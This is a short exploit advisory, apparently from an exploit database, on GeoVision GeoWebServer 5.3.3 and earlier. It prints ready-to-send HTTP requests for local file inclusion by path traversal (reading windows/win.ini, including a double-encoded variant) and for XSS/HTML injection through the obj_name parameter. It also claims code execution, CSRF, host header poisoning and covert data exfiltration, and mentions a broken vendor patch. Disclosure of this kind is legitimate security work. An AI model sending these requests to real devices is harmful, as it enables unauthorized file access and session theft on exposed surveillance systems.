# Exploit Author: Ken 's1ngular1ty' Pyle
# Vendor Homepage: https://www.geovision.com.tw/cyber_security.php

GEOVISION GEOWEBSERVER =< 5.3.3 are vulnerable to several XSS / HTML Injection / Local File Include / XML Injection / Code execution vectors. The application fails to properly sanitize user requests. This allows injection of HTML code and XSS / client side exploitation, including session theft:

Nested Exploitation of the LFI, XSS, HTML / Browser Injection:

GET /Visitor/bin/WebStrings.srf?file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini&obj_name=<script>test</script><iframe%20src=""> HTTP/1.1

Absolute exploitation of the LFI:

POST /Visitor/bin/WebStrings.srf?obj_name=win.ini

GET /Visitor//%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fwindows\win.ini

Additionally, the vendor has issued an ineffective / broken patch (https://www.geovision.com.tw/cyber_security.php) which does not appear to remediate or address the problem. Versions 5.3.3 and below continue to be affected. This is acknowledged by the vendor.


ex. obj_name=INJECTEDHTML / XSS

The application fails to properly enforce permissions and sanitize user request. This allows for LFI / Remote Code Execution through several vectors:

ex. /Visitor//%252e(path to target)

These vectors can be blended / nested to exfiltrate data in a nearly undetectable manner, through the API:

The devices are vulnerable to HOST HEADER POISONING and CROSS-SITE REQUEST FORGERY against the web application. These can be used for various vectors of attack.

These attacks were disclosed as part of the IOTVillage Presentation:
